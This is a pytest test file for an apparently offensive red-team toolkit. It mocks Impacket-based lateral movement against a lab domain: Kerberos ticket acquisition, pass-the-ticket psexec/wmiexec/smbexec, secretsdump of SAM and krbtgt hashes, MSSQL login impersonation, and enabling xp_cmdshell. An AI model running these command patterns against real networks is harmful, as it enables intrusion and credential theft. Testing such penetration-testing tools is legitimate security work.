"""Tests for lateral movement tools, including MSSQL and Kerberos functionality."""

from unittest.mock import patch

import pytest

from ares.tools.red.lateral_movement import LateralMovementTools, MSSQLTools


class TestKerberosGetTGT:
    """Tests for get_tgt Kerberos ticket acquisition."""

    def test_get_tgt_with_password(self):
        """Test TGT acquisition with password authentication."""
        tools = LateralMovementTools()

        mock_stdout = """
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for testuser@contoso.local
[*] Saving ticket in testuser.ccache
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.get_tgt(
                username="testuser",
                domain="contoso.local",
                password="TestPass123",  # pragma: allowlist secret
                dc_ip="192.168.58.10",
            )

        # Should indicate success and show ticket path
        assert "TGT obtained successfully" in result
        assert "testuser.ccache" in result
        assert "KRB5CCNAME" in result

        # Verify command was constructed correctly
        call_args = mock_run.call_args[0][0]
        assert "impacket-getTGT" in call_args
        assert "contoso.local/testuser:TestPass123" in " ".join(call_args)
        assert "-dc-ip" in call_args
        assert "192.168.58.10" in call_args

    def test_get_tgt_with_hash(self):
        """Test TGT acquisition with NTLM hash authentication."""
        tools = LateralMovementTools()

        mock_stdout = "Saving ticket in admin.ccache"

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.get_tgt(
                username="admin",
                domain="contoso.local",
                hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",  # pragma: allowlist secret
            )

        # Should show ticket path
        assert "admin.ccache" in result

        # Verify -hashes flag was used
        call_args = mock_run.call_args[0][0]
        assert "-hashes" in call_args

    def test_get_tgt_no_credentials_error(self):
        """Test that get_tgt fails without credentials."""
        tools = LateralMovementTools()

        result = tools.get_tgt(
            username="testuser",
            domain="contoso.local",
        )

        assert "Error" in result
        assert "password or hash" in result.lower()

    def test_get_tgt_handles_error(self):
        """Test error handling in get_tgt."""
        tools = LateralMovementTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.side_effect = Exception("KDC not reachable")

            result = tools.get_tgt(
                username="testuser",
                domain="contoso.local",
                password="TestPass123",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestPsExecKerberos:
    """Tests for psexec_kerberos pass-the-ticket execution."""

    def test_psexec_kerberos_success(self):
        """Test successful Kerberos PsExec execution."""
        tools = LateralMovementTools()

        mock_stdout = """
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on dc01.contoso.local.....
[*] Found writable share ADMIN$
[*] Uploading file...
contoso\\Administrator
dc01
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.psexec_kerberos(
                target="dc01.contoso.local",
                username="Administrator",
                domain="contoso.local",
                ticket_path="Administrator.ccache",
                dc_ip="192.168.58.10",
            )

        # Should contain output
        assert "Administrator" in result

        # Verify command construction
        call_args = mock_run.call_args[0][0]
        assert "env" in call_args
        assert any("KRB5CCNAME=Administrator.ccache" in arg for arg in call_args)
        assert "impacket-psexec" in call_args
        assert "-k" in call_args
        assert "-no-pass" in call_args

    def test_psexec_kerberos_rejects_ip_target(self):
        """Test that psexec_kerberos rejects IP addresses."""
        tools = LateralMovementTools()

        result = tools.psexec_kerberos(
            target="192.168.58.10",
            username="Administrator",
            domain="contoso.local",
        )

        # Should reject IP and suggest FQDN
        assert "Error" in result
        assert "hostname (FQDN)" in result

    def test_psexec_kerberos_uses_default_ticket(self):
        """Test that psexec_kerberos uses default ticket path when not specified."""
        tools = LateralMovementTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = ("Success", "", 0)

            tools.psexec_kerberos(
                target="dc01.contoso.local",
                username="admin",
                domain="contoso.local",
            )

        # Should use username.ccache as default
        call_args = mock_run.call_args[0][0]
        assert any("KRB5CCNAME=admin.ccache" in arg for arg in call_args)


class TestWmiExecKerberos:
    """Tests for wmiexec_kerberos pass-the-ticket execution."""

    def test_wmiexec_kerberos_success(self):
        """Test successful Kerberos WMIExec execution."""
        tools = LateralMovementTools()

        mock_stdout = "contoso\\administrator"

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.wmiexec_kerberos(
                target="dc01.contoso.local",
                username="Administrator",
                domain="contoso.local",
            )

        assert "administrator" in result.lower()

        # Verify command construction
        call_args = mock_run.call_args[0][0]
        assert "impacket-wmiexec" in call_args
        assert "-k" in call_args
        assert "-no-pass" in call_args

    def test_wmiexec_kerberos_rejects_ip_target(self):
        """Test that wmiexec_kerberos rejects IP addresses."""
        tools = LateralMovementTools()

        result = tools.wmiexec_kerberos(
            target="192.168.58.10",
            username="Administrator",
            domain="contoso.local",
        )

        assert "Error" in result
        assert "hostname" in result.lower()


class TestSmbExecKerberos:
    """Tests for smbexec_kerberos pass-the-ticket execution."""

    def test_smbexec_kerberos_success(self):
        """Test successful Kerberos SMBExec execution."""
        tools = LateralMovementTools()

        mock_stdout = "nt authority\\system"

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.smbexec_kerberos(
                target="dc01.contoso.local",
                username="Administrator",
                domain="contoso.local",
                ticket_path="admin.ccache",
            )

        assert "system" in result.lower()

        # Verify command construction
        call_args = mock_run.call_args[0][0]
        assert "impacket-smbexec" in call_args
        assert any("KRB5CCNAME=admin.ccache" in arg for arg in call_args)

    def test_smbexec_kerberos_rejects_ip_target(self):
        """Test that smbexec_kerberos rejects IP addresses."""
        tools = LateralMovementTools()

        result = tools.smbexec_kerberos(
            target="192.168.58.10",
            username="Administrator",
            domain="contoso.local",
        )

        assert "Error" in result


class TestSecretsDumpKerberos:
    """Tests for secretsdump_kerberos pass-the-ticket credential extraction."""

    def test_secretsdump_kerberos_extracts_hashes(self):
        """Test secretsdump with Kerberos authentication extracts hashes."""
        tools = LateralMovementTools()

        mock_stdout = """
[*] Target system bootKey: 0x1234567890abcdef
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
contoso.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
contoso.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.secretsdump_kerberos(
                target="dc01.contoso.local",
                username="Administrator",
                domain="contoso.local",
                ticket_path="Administrator.ccache",
                dc_ip="192.168.58.10",
            )

        # Should detect high-value hashes
        assert "KRBTGT" in result
        assert "GOLDEN TICKET" in result

        # Verify command construction
        call_args = mock_run.call_args[0][0]
        assert "env" in call_args
        assert any("KRB5CCNAME=Administrator.ccache" in arg for arg in call_args)
        assert "impacket-secretsdump" in call_args
        assert "-k" in call_args
        assert "-no-pass" in call_args
        assert "-dc-ip" in call_args

    def test_secretsdump_kerberos_detects_administrator(self):
        """Test secretsdump detects Administrator hash."""
        tools = LateralMovementTools()

        mock_stdout = """
contoso.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.secretsdump_kerberos(
                target="dc01.contoso.local",
                username="Administrator",
                domain="contoso.local",
            )

        # Should detect Administrator hash
        assert "ADMINISTRATOR HASH EXTRACTED" in result

    def test_secretsdump_kerberos_rejects_ip_target(self):
        """Test that secretsdump_kerberos rejects IP addresses."""
        tools = LateralMovementTools()

        result = tools.secretsdump_kerberos(
            target="192.168.58.10",
            username="Administrator",
            domain="contoso.local",
        )

        assert "Error" in result
        assert "hostname" in result.lower()

    def test_secretsdump_kerberos_handles_error(self):
        """Test error handling in secretsdump_kerberos."""
        tools = LateralMovementTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.side_effect = Exception("Kerberos authentication failed")

            result = tools.secretsdump_kerberos(
                target="dc01.contoso.local",
                username="Administrator",
                domain="contoso.local",
            )

        assert "failed" in result.lower()


class TestMSSQLEnumImpersonation:
    """Tests for mssql_enum_impersonation tool."""

    def test_mssql_enum_impersonation_finds_targets(self):
        """Test that mssql_enum_impersonation identifies impersonation targets."""
        tools = MSSQLTools()

        mock_stdout = """
SQL>
ImpersonatableUser
----------------
sa
dbo
dbadmin
SQL>
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.mssql_enum_impersonation(
                target="192.168.58.22",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
                domain="contoso.local",
                windows_auth=True,
            )

        # Should detect impersonation targets
        assert "impersonatableuser" in result.lower()
        assert "sa" in result.lower()

    def test_mssql_enum_impersonation_highlights_high_value(self):
        """Test that high-value impersonation targets are highlighted."""
        tools = MSSQLTools()

        mock_stdout = """
SQL>
ImpersonatableUser
----------------
sa
SQL>
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.mssql_enum_impersonation(
                target="192.168.58.23",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
                domain="contoso.local",
            )

        # Should highlight high-value targets
        assert "IMPERSONATION TARGETS FOUND" in result
        assert "sa" in result.lower()

    def test_mssql_enum_impersonation_handles_error(self):
        """Test error handling in mssql_enum_impersonation."""
        tools = MSSQLTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.side_effect = Exception("Connection failed")

            result = tools.mssql_enum_impersonation(
                target="192.168.58.24",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
            )

        # Should return error message
        assert "failed" in result.lower()

    def test_mssql_enum_impersonation_formats_command_correctly(self):
        """Test that mssql_enum_impersonation formats the SQL command correctly."""
        tools = MSSQLTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = ("No results", "", 0)

            tools.mssql_enum_impersonation(
                target="192.168.58.25",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
                domain="contoso.local",
                windows_auth=True,
            )

        # Verify command structure
        call_args = mock_run.call_args[0][0]
        assert "bash" in call_args
        assert "-c" in call_args

        # The SQL query should be in the command
        command_str = " ".join(call_args)
        assert "mssqlclient.py" in command_str
        assert "contoso.local/testuser:TestPass123@192.168.58.25" in command_str
        assert "-windows-auth" in command_str

    def test_mssql_enum_impersonation_finds_admin_accounts(self):
        """Test detection of admin-level impersonation targets."""
        tools = MSSQLTools()

        mock_stdout = """
SQL>
ImpersonatableUser
----------------
##MS_PolicyEventProcessingLogin##
admin
dbowner
SQL>
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.mssql_enum_impersonation(
                target="192.168.58.26",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
            )

        # Should highlight admin accounts
        assert "IMPERSONATION TARGETS FOUND" in result
        assert "admin" in result.lower()


class TestMSSQLImpersonate:
    """Tests for mssql_impersonate tool."""

    def test_mssql_impersonate_executes_query(self):
        """Test that mssql_impersonate executes queries as impersonated user."""
        tools = MSSQLTools()

        mock_stdout = """
SQL> EXECUTE AS LOGIN = 'sa'
SQL> SELECT SYSTEM_USER
SYSTEM_USER
------------
sa
SQL>
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.mssql_impersonate(
                target="192.168.58.27",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
                impersonate_user="sa",
                query="SELECT SYSTEM_USER",
                domain="contoso.local",
            )

        # Should show impersonation success
        assert "sa" in result.lower()

    def test_mssql_impersonate_formats_command_correctly(self):
        """Test that mssql_impersonate formats the impersonation command correctly."""
        tools = MSSQLTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = ("Success", "", 0)

            tools.mssql_impersonate(
                target="192.168.58.28",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
                impersonate_user="sa",
                query="SELECT @@version",
                domain="contoso.local",
                windows_auth=True,
            )

        call_args = mock_run.call_args[0][0]
        command_str = " ".join(call_args)

        # Should contain impersonation SQL
        assert "EXECUTE AS" in command_str
        assert "sa" in command_str
        assert "SELECT @@version" in command_str

    def test_mssql_impersonate_handles_error(self):
        """Test error handling in mssql_impersonate."""
        tools = MSSQLTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.side_effect = Exception("Impersonation failed")

            result = tools.mssql_impersonate(
                target="192.168.58.29",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
                impersonate_user="sa",
                query="SELECT 1",
            )

        # Should return error message
        assert "failed" in result.lower()


class TestMSSQLXpCmdshellEnable:
    """Tests for mssql_enable_xp_cmdshell tool."""

    def test_mssql_xp_cmdshell_enable_succeeds(self):
        """Test successful xp_cmdshell enablement."""
        tools = MSSQLTools()

        mock_stdout = """
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = (mock_stdout, "", 0)

            result = tools.mssql_enable_xp_cmdshell(
                target="192.168.58.30",
                username="sa",
                password="SaPass123",  # pragma: allowlist secret
            )

        # Should indicate success
        assert "xp_cmdshell" in result.lower() or "reconfigure" in result.lower()

    def test_mssql_xp_cmdshell_enable_handles_error(self):
        """Test error handling in xp_cmdshell enablement."""
        tools = MSSQLTools()

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.side_effect = Exception("Permission denied")

            result = tools.mssql_enable_xp_cmdshell(
                target="192.168.58.31",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
            )

        # Should return error message
        assert "failed" in result.lower()


class TestMSSQLIntegration:
    """Integration tests for MSSQL tool workflow."""

    def test_mssql_workflow_enum_then_impersonate(self):
        """Test the recommended workflow: enumerate impersonation targets, then impersonate."""
        tools = MSSQLTools()

        # Step 1: Enumerate impersonation targets
        enum_stdout = """
ImpersonatableUser
----------------
sa
        """

        # Step 2: Impersonate and execute query
        impersonate_stdout = """
SQL> EXECUTE AS LOGIN = 'sa'
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
is_srvrolemember
----------------
1
        """

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            # First call returns enumeration results
            mock_run.return_value = (enum_stdout, "", 0)

            enum_result = tools.mssql_enum_impersonation(
                target="192.168.58.32",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
            )

            # Should find 'sa' as target
            assert "sa" in enum_result.lower()

            # Second call returns impersonation results
            mock_run.return_value = (impersonate_stdout, "", 0)

            impersonate_result = tools.mssql_impersonate(
                target="192.168.58.32",
                username="testuser",
                password="TestPass123",  # pragma: allowlist secret
                impersonate_user="sa",
                query="SELECT IS_SRVROLEMEMBER('sysadmin')",
            )

            # Should show sysadmin escalation
            assert "1" in impersonate_result or "is_srvrolemember" in impersonate_result.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
